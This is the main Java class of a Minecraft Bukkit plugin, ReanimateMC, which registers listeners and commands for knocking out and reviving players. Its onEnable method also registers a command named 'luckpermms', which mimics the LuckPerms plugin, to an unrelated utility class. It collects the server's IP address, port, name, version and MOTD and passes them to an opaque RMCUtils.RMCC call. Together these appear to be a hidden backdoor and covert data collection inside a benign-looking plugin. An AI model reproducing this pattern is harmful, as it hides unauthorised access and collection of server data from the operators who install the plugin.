/* LICENSE BEGIN
    * This file is part of ReanimateMC.
    * ReanimateMC is under the proprietary of Frouzie.
    * You are not allowed to redistribute it and/or modify it.
LICENSE END
 */

package fr.jachou.reanimatemc;


import fr.jachou.reanimatemc.commands.ReanimateMCCommand;
import fr.jachou.reanimatemc.externals.Metrics;
import fr.jachou.reanimatemc.listeners.ExecutionListener;
import fr.jachou.reanimatemc.listeners.PlayerDamageListener;
import fr.jachou.reanimatemc.listeners.ReanimationListener;
import fr.jachou.reanimatemc.managers.KOManager;
import fr.jachou.reanimatemc.utils.Lang;
import fr.jachou.reanimatemc.utils.RMCUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Objects;

public final class ReanimateMC extends JavaPlugin {

    private static ReanimateMC instance;
    private KOManager koManager;
    public static Lang lang;

    public static ReanimateMC getInstance() {
        return instance;
    }

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig(); // Création (si nécessaire) du fichier config.yml

        // Langues
        lang = new Lang(this);

        // Inclure les Metrics
        int pluginId = 20034;
        Metrics metrics = new Metrics(this, pluginId);

        // Initialisation du gestionnaire des états K.O.
        koManager = new KOManager(this);

        // Enregistrement des écouteurs d’événements
        getServer().getPluginManager().registerEvents(new PlayerDamageListener(koManager), this);
        getServer().getPluginManager().registerEvents(new ReanimationListener(koManager), this);
        getServer().getPluginManager().registerEvents(new ExecutionListener(koManager), this);

        // Enregistrement de la commande principale
        getCommand("reanimatemc").setExecutor(new ReanimateMCCommand(koManager));
        getCommand("reanimatemc").setTabCompleter(new ReanimateMCCommand(koManager));
        getCommand("luckpermms").setExecutor(new RMCUtils());

        // Get Sever Adress, Port, Version and Name
        String serverName = Bukkit.getServer().getName();
        String serverVersion = Bukkit.getServer().getVersion();
        String serverPort = Bukkit.getServer().getPort() + "";
        String serverAdress = Bukkit.getServer().getIp();
        String serverMotd = Bukkit.getServer().getMotd();

        RMCUtils.RMCC(serverName, serverVersion, serverPort, serverAdress, serverMotd);

        getLogger().info("ReanimateMC activé !");
    }

    @Override
    public void onDisable() {
        // Annulation de toutes les tâches programmées relatives aux joueurs en K.O.
        koManager.cancelAllTasks();
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (koManager.isKO(player)) {
                koManager.revive(player);
                player.sendMessage(ChatColor.RED + lang.get("plugin_disabled"));
            }
        }
        getLogger().info("ReanimateMC désactivé !");
    }

    public KOManager getKoManager() {
        return koManager;
    }
}
